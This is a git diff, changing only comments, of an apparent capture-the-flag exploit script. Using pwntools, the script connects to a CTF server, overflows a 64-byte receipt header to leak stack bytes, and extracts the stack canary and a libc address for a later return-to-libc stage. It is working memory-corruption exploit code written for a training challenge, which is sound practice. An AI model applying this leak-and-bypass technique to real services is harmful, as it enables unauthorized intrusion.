@@ -18,7 +18,7 @@ RET = 0x000000000040101a
 #p = process(elf.path)
 p = remote("offsec.m0lecon.it", 13568)
 
-#-------- Stage 1: leak puts-------
+#leak puts
 p.recvuntil(b'>')
 p.sendline(b"1")
 p.recvuntil(b'Type the receipt header (up to 64 chars):\n')
@@ -27,11 +27,11 @@ p.send(b'A' * 64)
 p.recvuntil(b'--- RECEIPT ---\n')
 data = p.recv(256)          # get all 256 bytes fwrite sends
 
-# The first 64 bytes are your A's; bytes 64+ are leaked stack
+#64+ are leaked stack
 leaked_bytes = data[64:]
 print(f"[*] Leaked {len(leaked_bytes)} stack bytes")
 
-# Extract a candidate address from the leaked bytes (8 bytes at a time)
+# Extract 8 bytes at a time
 for i in range(0, len(leaked_bytes) - 7, 8):
     val = u64(leaked_bytes[i:i+8])
     #print(f"offset +{i}: {hex(val)}")
@@ -39,7 +39,7 @@ for i in range(0, len(leaked_bytes) - 7, 8):
 canary = u64(leaked_bytes[56:64])
 print(hex(canary))
 
-libc_leak = u64(leaked_bytes[88:96])  # the address that equals __libc_start_call_main+117
+libc_leak = u64(leaked_bytes[88:96])  # the address equals __libc_start_call_main+117
 print(hex(libc_leak))
 
 for name, addr in libc.symbols.items():
